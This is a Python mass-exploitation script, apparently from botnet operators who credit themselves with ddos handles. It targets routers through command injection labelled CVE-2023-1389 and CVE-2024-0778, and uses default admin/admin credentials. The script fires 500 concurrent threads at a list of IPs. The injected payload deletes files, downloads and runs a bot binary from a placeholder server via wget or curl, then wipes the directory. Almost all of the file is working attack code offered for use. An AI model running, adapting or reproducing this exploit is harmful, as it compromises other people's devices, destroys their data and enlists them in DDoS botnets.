import requests, urllib.parse, sys, threading, time, fileinput
from threading import Thread
from concurrent.futures import ThreadPoolExecutor
import urllib3
urllib3.disable_warnings()

threads = 0
payload = "cd /tmp || cd /mnt || cd /root || cd / || cd; rm -rf *; wget http://YOUR_BIN_SEVER_IP/x86 || curl -O http://YOUR_BIN_SEVER_IP/x86; chmod 777 x86; ./x86 tplink; rm -rf *"
show_shit = False #show errors

def exploit_cve2023(ip):
    global threads, payload, show_shit
    try:
        cve2023 = requests.post(f"http://{ip}/cgi-bin/luci;stok=/locale", data={"_tn": "locale", "country": f"`{payload}`"}, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0"}, verify=False, timeout=5)
        if cve2023.status_code == 200:
            print("[CVE-2023-1389] " + ip+ ": hacked")
        threads-=1
        return
    except:
        threads-=1
        if show_shit == True:
            print(ip+": timeout")

def exploit_cve2024(ip):
    global threads, payload, show_shit
    try:
        login = requests.post(f"http://{ip}/login.cgi", data={"username": "admin", "password": "admin"}, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0"}, timeout=5, verify=False)
        if login.status_code != 200:
            if show_shit == True:
                print("[CVE-2024-0778] Login failed")
            threads-=1
            return
        csrf_token = requests.get(f"http://{ip}/cgi-bin/luci", timeout=5, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0"}, verify=False).cookies.get("csrf_token")
        cve2024 = requests.post(f"http://{ip}/cgi-bin/luci;stok={csrf_token}/admin/system", data={"_tn": "system", "cmd": f"`{payload}`"}, headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0"}, timeout=5, verify=False)
        threads-=1
        if cve2024.status_code == 200:
            print("[CVE-2024-0778] " + ip+ ": hacked")
    except:
        if show_shit == True:
            print(ip+": timeout")
        threads-=1

print("started.\nmade by @wertyddos | @richddos | @cyber_raw")
with ThreadPoolExecutor(max_workers=500) as executor:
    for line in fileinput.input():
        target = line.rstrip()
        executor.submit(exploit_cve2023, target)
        executor.submit(exploit_cve2024, target)